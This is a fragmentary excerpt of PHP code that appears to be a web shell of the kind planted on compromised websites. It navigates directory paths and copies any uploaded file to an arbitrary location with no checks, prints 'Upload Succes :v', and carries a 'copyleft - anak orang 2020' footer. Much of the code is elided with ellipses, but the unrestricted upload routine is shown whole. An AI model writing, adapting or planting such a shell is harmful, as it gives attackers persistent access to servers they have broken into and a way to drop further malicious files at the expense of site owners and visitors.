...
$i++){ echo "$paths[$i]";
 ...
 if(isset($_FILES['file'])){ if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ echo '<font color="green">Upload Succes :v</font><br />';
...
<input type="submit" value=">">
 ...
 } echo '<center><br/><p> copyleft - anak orang 2020</p></center>
</body>
</html>';
